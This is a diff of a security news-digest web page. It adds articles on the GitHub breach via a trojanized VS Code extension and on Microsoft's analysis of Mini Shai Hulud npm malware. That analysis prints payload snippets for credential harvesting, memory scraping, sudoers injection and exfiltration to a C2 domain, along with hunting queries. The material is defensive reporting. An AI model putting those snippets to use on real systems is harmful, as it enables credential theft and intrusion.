@@ -59,47 +59,189 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-05-20</h1>
+        <h1>Security Briefing // 2026-05-21</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Microsoft Releases Mitigation for YellowKey BitLocker Bypass CVE-2026-45585 Exploit</button></li><li><button onclick="show('art-1')">Microsoft shares mitigation for YellowKey Windows zero-day</button></li><li><button onclick="show('art-2')">Grafana GitHub Breach Exposes Source Code via TanStack npm Attack</button></li><li><button onclick="show('art-3')">Kieback & Peter DDC Building Controllers</button></li><li><button onclick="show('art-4')">Coverage-Driven Sustained Testing (CDST): A Graph-Oriented Model for Open-Ended Agentic Workflows</button></li><li><button onclick="show('art-5')">How Storm-2949 turned a compromised identity into a cloud-wide breach</button></li><li><button onclick="show('art-6')">CISA Admin Leaked AWS GovCloud Keys on Github</button></li><li><button onclick="show('art-7')">Patch Tuesday, May 2026 Edition</button></li><li><button onclick="show('art-8')">GTIG AI Threat Tracker: Adversaries Leverage AI for Vulnerability Exploitation, Augmented Operations, and Initial Access</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">GitHub links repo breach to TanStack npm supply-chain attack</button></li><li><button onclick="show('art-1')">GitHub Internal Repositories Breached via Malicious Nx Console VS Code Extension</button></li><li><button onclick="show('art-2')">Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft</button></li><li><button onclick="show('art-3')">CISA Adds Seven Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-4')">Grafana GitHub Breach Exposes Source Code via TanStack npm Attack</button></li><li><button onclick="show('art-5')">Coverage-Driven Sustained Testing (CDST): A Graph-Oriented Model for Open-Ended Agentic Workflows</button></li><li><button onclick="show('art-6')">CISA Admin Leaked AWS GovCloud Keys on Github</button></li><li><button onclick="show('art-7')">Patch Tuesday, May 2026 Edition</button></li><li><button onclick="show('art-8')">GTIG AI Threat Tracker: Adversaries Leverage AI for Vulnerability Exploitation, Augmented Operations, and Initial Access</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Microsoft Releases Mitigation for YellowKey BitLocker Bypass CVE-2026-45585 Exploit</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/microsoft-releases-mitigation-for.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft on Tuesday released a mitigation for a BitLocker bypass vulnerability named [YellowKey](https://thehackernews.com/2026/05/windows-zero-days-expose-bitlocker.html) following its public disclosure last week.
-The zero-day flaw, now tracked as CVE-2026-45585, carries a CVSS score of 6.8. It has been described as a BitLocker security feature bypass.
-"Microsoft is aware of a security feature bypass vulnerability in Windows publicly referred to as 'YellowKey,'" the tech giant [said](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-45585) in an advisory. "The proof of concept for this vulnerability has been made public, violating coordinated vulnerability best practices."
-The issue impacts Windows 11 version 26H1 for x64-based Systems, Windows 11 Version 24H2 for x64-based Systems, Windows 11 Version 25H2 for x64-based Systems, Windows Server 2025, and Windows Server 2025 (Server Core installation).
-YellowKey was disclosed by a security researcher named Chaotic Eclipse (aka Nightmare-Eclipse). It essentially allows placing specially crafted 'FsTx' files on a USB drive or EFI partition, plugging the USB drive into the target Windows computer with BitLocker protections turned on, rebooting into the Windows Recovery Environment (WinRE), and triggering a shell with unrestricted access by holding down the CTRL key.
-"If you did everything properly, a shell will spawn with unrestricted access to the BitLocker protected volume," the researcher noted in a GitHub post.
-Redmond noted that successful exploitation could permit an attacker with physical access to sidestep the BitLocker Device Encryption feature on the system storage device and gain access to encrypted data.
-To address the risk, the following mitigations have been outlined:
-- Mount the WinRE image on each device.
-- Mount the system registry hive of the mounted WinRE image.
-- Modify BootExecute by removing "autofstx.exe" value from Session Manager's BootExecute REG_MULTI_SZ value.
-- Save and unload
-[Registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives). - Unmount and commit the updated WinRE image.
-- Reestablish BitLocker trust for WinRE.
-"Specifically, you prevent the FsTx Auto Recovery Utility, autofstx.exe, from automatically starting when the WinRE image launches," security researcher Will Dormann [said](https://infosec.exchange/@wdormann/116604563324444723). "With this change, the Transactional NTFS replaying that deletes winpeshl.ini no longer happens. It also recommends switching from TPM-only to TPM+PIN."
-Microsoft also emphasized that users can be safeguarded against exploitation by [configuring BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/configure) on already encrypted devices with "TPM-only" protector by switching to "TPM+PIN" mode via PowerShell, the command line, or the control panel. This will require a PIN to decrypt the drive at startup, effectively backing YellowKey attacks.
-On devices that are not encrypted, administrators are advised to enable the "Require additional authentication at startup" option via Microsoft Intune or Group Policies and ensure that "Configure TPM startup PIN" is set to "Require startup PIN with TPM."
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Microsoft shares mitigation for YellowKey Windows zero-day</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-shares-mitigation-for-yellowkey-windows-zero-day/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft has shared mitigations for YellowKey, a recently disclosed Windows BitLocker zero-day vulnerability that grants access to protected drives. [...]
+            <h2 class="article-title">GitHub links repo breach to TanStack npm supply-chain attack</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/github-links-repo-breach-to-tanstack-npm-supply-chain-attack/" target="_blank">Original Link</a></p>
+            <div class="content-text">GitHub says the hackers who breached 3,800 internal repositories gained access via a malicious version of the Nx Console VS Code extension, compromised in last week's TanStack npm supply-chain attack. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">GitHub Internal Repositories Breached via Malicious Nx Console VS Code Extension</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/github-internal-repositories-breached.html" target="_blank">Original Link</a></p>
+            <div class="content-text">GitHub on Wednesday officially confirmed that the [breach of its internal repositories](https://thehackernews.com/2026/05/github-investigating-teampcp-claimed.html) was the result of a compromise of an employee device involving a poisoned version of the Nx Console Microsoft Visual Studio Code (VS Code) extension.
+The development comes as the Nx team revealed that the extension, [nrwl.angular-console](https://thehackernews.com/2026/05/compromised-nx-console-18950-targeted.html), was breached after one of its developers' systems was hacked in the wake of the recent [TanStack](https://thehackernews.com/2026/05/mini-shai-hulud-worm-compromises.html) supply chain attack. Other companies that were impacted by the TanStack compromise include [OpenAI, Mistral AI](https://thehackernews.com/2026/05/tanstack-supply-chain-attack-hits-two.html), and [Grafana Labs](https://thehackernews.com/2026/05/grafana-github-breach-exposes-source.html).
+"We have no evidence of impact to customer information stored outside of GitHub's internal repositories, such as our customer's own enterprises, organizations, and repositories," Alexis Wales, Chief Information Security Officer of GitHub, [said](https://github.blog/security/investigating-unauthorized-access-to-githubs-internal-repositories/) in a statement.
+"Some of GitHub's internal repositories contain information from customers, for example, excerpts of support interactions. If any impact is discovered, we will notify customers via established incident response and notification channels."
+The attack is said to have allowed the threat actor, a cybercriminal group known as TeamPCP, to exfiltrate about 3,800 repositories. GitHub said it has taken steps to contain the incident and rotated critical secrets, adding it's continuing to monitor the situation for follow-on activity.
+In a post on X, Jeff Cross, co-founder of Narwhal Technologies, the company behind nx.dev, [said](https://x.com/jeffbcross/status/2057236396658811020), "this incident highlights that there need to be deeper, more fundamental changes to how we and other maintainers need to think about securing developer tooling and open source distribution."
+"We're also beginning conversations with other high-profile open source maintainers about how we can work together on some of the deeper structural problems around software supply chain security. A lot of the assumptions the ecosystem has operated under for years no longer hold."
+In recent months, TeamPCP has rapidly gained notoriety for large-scale software supply chain attacks, specifically going after widely-used open-source projects and security-adjacent tools that developers rely on.
+What's notable here is that the trojanized version of the VS Code extension was live on Visual Studio Marketplace only for 18 minutes (between 12:30 p.m. and 12:48 p.m. UTC on May 18, 2026). But this short window was enough for the attackers to distribute a credential stealer capable of harvesting sensitive data from 1Password vaults, Anthropic Claude Code configurations, npm, GitHub, and Amazon Web Services (AWS).
+"The extension looked and behaved like normal Nx Console, but on startup it silently ran a single shell command that downloaded and executed a hidden package from a planted commit on the official nrwl/nx GitHub repository," OX Security researcher Nir Zadok [said](https://www.ox.security/blog/teampcp-strikes-again-how-a-trojan-vs-code-extension-brought-down-github/). "The command was disguised as a routine MCP setup task so it would not raise suspicion."
+The interlinked nature of modern software has allowed TeamPCP to unleash a self-sustaining cycle of new compromises. The pattern that drives home this aspect is deceptively simple as it's nefarious: break into one trusted tool, steal credentials from developer systems that may install it, and use those credentials to break into the next legitimate tool.
+"Every popular extension marketplace ships with auto-update on by default. VS Code, Cursor, the whole lineup," Aikido security researcher Raphael Silva [said](https://www.aikido.dev/blog/vs-code-extension-github-breach). "The reasoning makes sense in isolation, because most developers never update anything manually, so leaving it off means a long tail of editors running stale, vulnerable code."
+"The trade-off stops making sense once you account for hostile/compromised publishers. Auto-update gives an attacker who controls a release a direct push channel into every machine running that extension. Marketplaces don't impose any review gate or waiting period between when an update is published and when installed clients pull it in."
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
         <div id="art-2" class="article-body">
+            <h2 class="article-title">Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft has identified an active supply chain attack targeting the @antv node package manager (npm) package ecosystem. A threat actor compromised an @antv maintainer account and published malicious versions of widely used data-visualization packages, resulting in cascading downstream impact.
+The compromise propagated through dependency chains into libraries like echarts-for-react (which has more than 1 million weekly downloads), expanding the blast radius into CI/CD pipelines and cloud workloads across the ecosystem. The malicious payload—a ~499 KB obfuscated JavaScript file—runs silently during npm install and is purpose-built to steal credentials from GitHub Actions environments.
+Key capabilities observed in the payload include multi-platform credential theft (GitHub, Amazon Web Services, HashiCorp Vault, npm, Kubernetes, 1Password), GitHub Action Runner process memory scraping, privilege escalation, dual-channel data exfiltration, and Supply chain Levels for Software Artifacts (SLSA) provenance forgery. These capabilities suggest a deliberate effort to evade analysis and an apparent focus on CI/CD environments.
+The authors of the antv account have also since confirmed in a ticket on the repo that the situation is now resolved.
+Attack chain overview
+The @antv organization maintains charting libraries (G2, G6) embedded across dashboards and applications. The attack proceeds through:
+- Maintainer account compromise and publication of malicious @antv package versions
+- Downstream dependency amplification (echarts-for-react, size-sensor, and others)
+- Automatic payload execution through a preinstall hook during npm install
+- Execution chain: node → shell → bun → payload (Bun runtime installed if absent)
+Technical analysis
+The payload replaces the legitimate index.js with a single-line obfuscated script.
+Obfuscation
+- Layer 1: 1,732 Base64-encoded strings in a rotated array, decoded through lookup function with the shuffle key 0xa31de
+- Layer 2: Critical strings such as command-and-control (C2) domain and env var names are encrypted with a custom PBKDF2 and SHA-256 cipher, which is decrypted at runtime.
+- Environment gating: The payload exits immediately if it’s not running on GitHub Actions on Linux
+- Branch avoidance: Skips the main, master, dependabot/, renovate/, and gh-pages when using Git API exfiltration
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 | // Layer 1: 1,732 strings in rotated array with base64 decode (function(_0x44be0e, _0x3ff020){ // Array shuffle IIFE with key 0xa31de _0x335af4['push'](_0x335af4['shift']()); })(_0x71ec, 0xa31de)); // Layer 2: PBKDF2+SHA256 runtime decryption for critical strings var e6 = "a8269c01069452afb8a54de904e6419578d155fdbdb9e566bab8576a4266b61e"; var t6 = "7f44e4ba6f6a71bd0f789e7f83bd3104"; var u5 = new du(e6, t6); // PBKDF2 cipher instance globalThis["f2959c600"] = function(s) { return u5.decode(s); }; // Environment gate - exits if not GitHub Actions on Linux this['isGitHubActions'] = process.env[f2959c600('68zz23c6NGR9...')] === 'true'; this['isLinuxRunner'] = process.env[f2959c600('NhUrwwYEwYIJ...')] === 'Linux'; |
+Credential theft
+The payload targets secrets across six platforms:
+- GitHub: Extracts GITHUB_TOKEN, scans for Personal Access Tokens (gh[op]_) and installation tokens (ghs_), validates through /user API, and enumerates repo and org secrets.
+- Amazon Web Services(AWS): Queries Instance Metadata Service (169.254.169[.]254), Elastic Container Service metadata (169.254.170[.]2), reads .aws/ files, harvests env vars, and then calls SecretsManager across all regions.
+- HashiCorp Vault: Searches 12+ token paths (/var/run/secrets/vault/token, ~/.vault-token, and others) and connects to a local Vault at 127.0.0[.]1:8200.
+- npm: Validates tokens using /-/whoami, exchanges OpenID Connect (OIDC) tokens for publish access, and enumerates packages
+- Kubernetes: Reads service account tokens and enumerates namespace secrets
+- 1Password: Interacts with command-line interface (CLI) and attempts master password extraction with two-factor authentication (2FA) bypass
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 | // AWS Secrets Manager enumeration 'secretsmanager:ListSecrets' 'secretsmanager:GetSecretValue(' // Vault token paths searched (12+ locations) '/var/run/secrets/vault/token' '/.vault-token' '/home/runner/.vault-token' '/root/.vault-token' '/etc/vault/token' // GitHub API secret enumeration '/actions/secrets?per_page=100' '/actions/organization-secrets?per_page=100' |
+Runner memory scraping
+The payload locates the GitHub Actions Runner.Worker PID using /proc scanning, then extracts runtime secrets using the following:
+1 2 3 4 5 6 7 | // Locates Runner.Worker PID via /proc 'findRunnerWorkerPIDLinux' // Scans /proc/<pid>/cmdline for "Runner.Worker" // Extracts secrets from process memory tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' | sort -u </pid> |
+This activity bypasses normal secret masking by reading secrets directly from runner process memory.
+Privilege escalation
+- Injects sudoers rule through bind mount: echo ‘runner ALL=(ALL) NOPASSWD:ALL’ > /mnt/runner
+- Modifies /etc/hosts for DNS redirection
+1 2 3 4 5 6 7 8 9 10 | // Injects passwordless sudo via /etc/sudoers.d bind mount at /mnt echo 'runner ALL=(ALL) NOPASSWD:ALL' > && chmod 0440 /mnt/runner // DNS manipulation sudo sh -c "echo '127.0.0.1 <target>' >> /etc/hosts" // Validates sudo access before operations sudo -n true </target> |
+Exfiltration
+Dual-channel exfiltration:
+- Primary: HTTPS to encrypted C2 domain (port 443) with DNS pre-check and health probe
+- Fallback: Git Data API — Creates blobs, trees, or commits in victim repositories on non-protected branches
+- Tertiary: Creates public repos under victim accounts with reversed description (“niagA oG eW ereH :duluH-iahS”); more than 2,200 of these repos have been observed as of this writing
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 | // Primary: HTTPS C2 with encrypted domain (port 443) let config = { 'domain': f2959c600('bXVunP4+izfR/cOx8zhW/fw8v6xFc4cvjYgGdbEE'), 'port': 0x1bb, // 443 'path': f2959c600('5WA4NOQUD/n/mNx/cqL4gSVQrTrwV+RBKO7TXeTIk3fFBUt+2arGDjc='), 'dry_run': false }; // Fallback: Git Data API - creates blobs/trees/commits in victim repos await j(token, '/repos/' + owner + '/' + repo + '/git/blobs', {'method': 'POST', 'body': JSON.stringify(stolen_data)}); '/git/trees' '/git/commits' // Branch filter - avoids protected branches to evade detection Dw = ['dependabot/', 'renovate/', 'gh-pages', 'docs/', 'copilot/', 'master', 'main']; |
+Propagation and persistence
+- Enumerates /user/repos and /user/orgs to spread into additional repositories
+- Installs Bun runtime, executes second-stage payload using bun run .claude/
+- Deploys token monitor for ongoing credential capture
+- Forges SLSA provenance attestations through Sigstore (Fulcio or Rekor) to appear legitimate
+Impact and blast radius
+- Direct compromise of @antv packages with broad ecosystem adoption
+- Amplification through downstream dependencies into thousands of projects
+- Cascading risk: stolen npm tokens enable further package poisoning, stolen GitHub tokens enable repo manipulation, and stolen AWS credentials enable cloud access
+- SLSA provenance forgery erodes trust in supply chain attestation frameworks
+How GitHub took action to prevent further harm
+Upon learning of the attack, GitHub acted immediately to limit further damage. It removed 640 malicious packages and invalidated 61,274 npm granular access tokens with write permissions and 2FA bypass, preventing leaked tokens from being used in this or similar attacks. GitHub also [published advisories](https://github.com/advisories?query=type%3Amalware) relevant to this malware campaign in the GitHub Advisory Database and alerted the community through Dependabot alerts and npm audit. It continues to monitor for additional affected packages and remove them as needed.
+Mitigation and protection guidance
+Microsoft recommends the following mitigations to reduce the impact of this threat:
+- Review dependency trees for direct or transitive usage of affected @antv/ packages.
+- Identify systems that installed or built affected package versions during the suspected exposure window.
+- Pin known-good package versions where possible and avoid automatic dependency upgrades until validation is complete.
+- Disable pre- and post-installation script execution by ensuring you run npm install with
+--ignore-scripts
+. - While GitHub team has already invalidated all the npm tokens that had write access and 2FA bypass, Microsoft Defender still recommends rotating credentials, tokens, npm access tokens, CI/CD secrets, and cloud credentials that might have been exposed in affected build or developer environments.
+- Rotate credentials, tokens, npm access tokens, CI/CD secrets, and cloud credentials that might have been exposed in affected build or developer environments.
+- Audit organization and personal GitHub accounts for public repositories with the description “niagA oG eW ereH :duluH-iahS” or other unexpected repositories created during the exposure window, and revoke any GitHub tokens that might have been implicated.
+- Audit CI/CD logs for unexpected outbound network connections, script execution, or suspicious package lifecycle activity.
+- Review npm package lockfiles, build logs, and artifact provenance for evidence of compromised package versions.
+[Enable cloud-delivered protection](https://learn.microsoft.com/en-us/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus)in Microsoft Defender Antivirus or equivalent antivirus protection.- Use Microsoft Defender XDR to investigate suspicious activity across endpoints, identities, cloud apps, and developer environments.
+- Use Microsoft Defender Vulnerability Management to search for antv packages across your estate.
+Microsoft Defender XDR Detections
+Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
+Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
+| Tactic | Observed activity | Microsoft Defender coverage |
+| Execution | Suspicious script execution during npm install or package lifecycle activity | Microsoft Defender Antivirus – Trojan:AIGen/NPMStealer – Backdoor:Python/ShaiWorm – Trojan:JS/ShaiWorm – Trojan:JS/ObfusNpmJs Microsoft Defender for Endpoint – Suspicious usage of Bun runtime – Suspicious Installation of Bun runtime – Suspicious Node.js process behavior |
+| Credential Access | Potential harvesting of environment variables, tokens, or developer secrets | Microsoft Defender for Endpoint – Credential access attempt – Suspicious cloud credential access by npm-cached binary – Kubernetes secrets enumeration indicative of credential access Microsoft Defender for Cloud Sha1-Hulud Campaign Detected: Possible command injection to exfiltrate credentials |
+| Command and Control | Potential outbound connections from build systems or developer machines | Microsoft Defender for Endpoint Connection to a custom network indicator |
+Microsoft Security Copilot
+Security Copilot customers can use the standalone experience to create their own prompts or run prebuilt promptbooks to automate incident response or investigation tasks related to this threat, including:
+- Incident investigation
+- Microsoft user analysis
+- Threat Intelligence 360 report based on MDTI article
+- Vulnerability or supply chain impact assessment
+Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.
+Microsoft Defender XDR Threat analytics
+https://security.microsoft.com/threatanalytics3/5879a0e7-f145-407b-bc84-1ae405a016ea/overview
+Advanced hunting
+The following sample queries let you search for a week’s worth of events. To explore up to 30 days of raw data, go to the Advanced Hunting page > Query tab, and update the time range to Last 30 days.
+Hunt for suspicious npm lifecycle script execution
+This query searches for Node.js and npm activity involving install lifecycle behavior and relevant package references.
+1 2 3 4 5 6 7 | DeviceProcessEvents | where FileName in~ ("node.exe", "npm.cmd", "npm.exe", "npx.cmd", "npx.exe") | where ProcessCommandLine has_any ("preinstall", "postinstall", "install") | where ProcessCommandLine has_any ("@antv", "echarts-for-react") | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName |
+Hunt for potential compromise of through malicious npm packages
+1 2 3 4 | DeviceProcessEvents | where Timestamp > ago(2d) | where FileName in ("bun", "bun.exe") | where ProcessCommandLine has "run index.js" |
+Hunt for affected dependencies in your software inventory
+1 2 3 | DeviceTvmSoftwareInventory | where SoftwareName has "antv" or SoftwareVendor has "antv" | project DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion |
+Hunt for suspicious outbound connection from python backdoor
+1 2 3 4 | DeviceNetworkEvents | where Timestamp > ago(2d) | where InitiatingProcessFileName startswith "python" | where InitiatingProcessCommandLine has "/cat.py" |
+Hunt for suspicious outbound activity from Node.js processes
+Searches for network connections initiated by Node.js or npm processes that reference package-related paths or commands.
+1 2 3 4 5 6 | DeviceNetworkEvents | where InitiatingProcessFileName in~ ("node.exe", "npm.exe", "npx.exe") | where InitiatingProcessCommandLine has_any ("@antv", "echarts-for-react", "node_modules") | project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName |
+Hunt for affected dependency references in developer directories
+This query searches for package manifest or lockfile activity that might contain relevant dependency references.
+1 2 3 4 5 6 | DeviceFileEvents | where FileName in~ ("package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml") | where FolderPath has_any ("node_modules", "src", "repo", "workspace") | where AdditionalFields has_any ("@antv", "echarts-for-react") | project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine |
+Hunt for post-compromise C2 activity
+1 2 3 | DeviceNetworkEvents | where Timestamp > ago(2d) | where RemoteUrl has "t.m-kosche.com" |
+Shai-Hulud npm supply-chain indicator observed inside a Kubernetes container
+1 2 3 | CloudProcessEvents | where ProcessCommandLine has_any ("IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner", "niagA oG eW ereH", ":duluH-iahS", "t.m-kosche.com", "7cb42f57561c321ecb09b4552802ae0ac55b3a7a", "@antv/setup") | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName |
+Indicators of Compromise (IOC)
+| Indicator | Type | Description |
+| @antv – whole account | Package scope | All packages maintained by the antv account were compromised. As per the latest statement from the account author’s this situation is now resolved. |
+| echarts-for-react | Package name | One of the major downstream packages impacted by the antv compromise. As per the latest statement from the repository author’s this situation is now resolved |
+| a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c | SHA-256 | Malicious payload JavaScript file |
+| fb5c97557230a27460fdab01fafcfabeaa49590bafd5b6ef30501aa9e0a51142 | SHA-256 | Malicious backdoor Python script |
+| t.m-kosche[.]com:443 | Domain | Infrastructure associated with campaign |
+| Index.js | File name | Malicious script or dropped file |
+| cat.py | File name | Malicious script or dropped file |
+References
+This research is provided by Microsoft Defender Security Research with contributions from Rahul Mohandas, Sumith Maniath, Ahmed Saleem Kasmani, Arvind Gowda, Sagar Patil, and members of Microsoft Threat Intelligence.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
+[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime) - Explore
+[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">CISA Adds Seven Known Exploited Vulnerabilities to Catalog</h2>
+            <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/05/20/cisa-adds-seven-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
+            <div class="content-text">CISA Adds Seven Known Exploited Vulnerabilities to Catalog
+CISA has added seven new vulnerabilities to its [Known Exploited Vulnerabilities (KEV) Catalog](/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation.
+[CVE-2008-4250](https://www.cve.org/CVERecord?id=CVE-2008-4250)Microsoft Windows Buffer Overflow Vulnerability[CVE-2009-1537](https://www.cve.org/CVERecord?id=CVE-2009-1537)Microsoft DirectX NULL Byte Overwrite Vulnerability[CVE-2009-3459](https://www.cve.org/CVERecord?id=CVE-2009-3459)Adobe Acrobat and Reader Heap-Based Buffer Overflow Vulnerability[CVE-2010-0249](https://www.cve.org/CVERecord?id=CVE-2010-0249)Microsoft Internet Explorer Use-After-Free Vulnerability[CVE-2010-0806](https://www.cve.org/CVERecord?id=CVE-2010-0806)Microsoft Internet Explorer Use-After-Free Vulnerability[CVE-2026-41091](https://www.cve.org/CVERecord?id=CVE-2026-41091)Microsoft Defender Elevation of Privilege Vulnerability[CVE-2026-45498](https://www.cve.org/CVERecord?id=CVE-2026-45498)Microsoft Defender Denial of Service Vulnerability
+These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.
+[Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities](/binding-operational-directive-22-01) established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the [BOD 22-01 Fact Sheet](/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf) for more information.
+Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of [KEV Catalog vulnerabilities](/known-exploited-vulnerabilities-catalog) as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the [specified criteria](/known-exploited-vulnerabilities).
+This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
             <h2 class="article-title">Grafana GitHub Breach Exposes Source Code via TanStack npm Attack</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/grafana-github-breach-exposes-source.html" target="_blank">Original Link</a></p>
             <div class="content-text">Grafana Labs, on May 19, 2026, said an investigation into its [recent breach](https://thehackernews.com/2026/05/grafana-github-token-breach-led-to.html) found no evidence of customer production systems or operations being compromised.
@@ -117,103 +259,7 @@ The development comes as GitHub [said](https://thehackernews.com/2026/05/github-
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">Kieback & Peter DDC Building Controllers</h2>
-            <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/ics-advisories/icsa-26-139-05" target="_blank">Original Link</a></p>
-            <div class="content-text">Kieback & Peter DDC Building Controllers
-Summary
-Successful exploitation of this vulnerability could allow an attacker to take control of the victim's browser.
-The following versions of Kieback & Peter DDC Building Controllers are affected:
-- DDC4002 <=1.12.14 (CVE-2026-4293)
-- DDC4100 <=1.12.14 (CVE-2026-4293)
-- DDC4200 <=1.12.14 (CVE-2026-4293)
-- DDC4200-L <=1.12.14 (CVE-2026-4293)
-- DDC4400 <=1.12.14 (CVE-2026-4293)
-- DDC4002e <=1.23.4 (CVE-2026-4293)
-- DDC4200e <=1.23.4 (CVE-2026-4293)
-- DDC4400e <=1.23.4 (CVE-2026-4293)
-- DDC4020e <=1.23.4 (CVE-2026-4293)
-- DDC4040e <=1.23.4 (CVE-2026-4293)
-- DDC520 <=1.24.1 (CVE-2026-4293)
-| CVSS | Vendor | Equipment | Vulnerabilities |
-|---|---|---|---|
-| CVSS v3 5.3 | Vendor Kieback & Peter | Equipment Kieback & Peter DDC Building Controllers | Vulnerabilities Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |
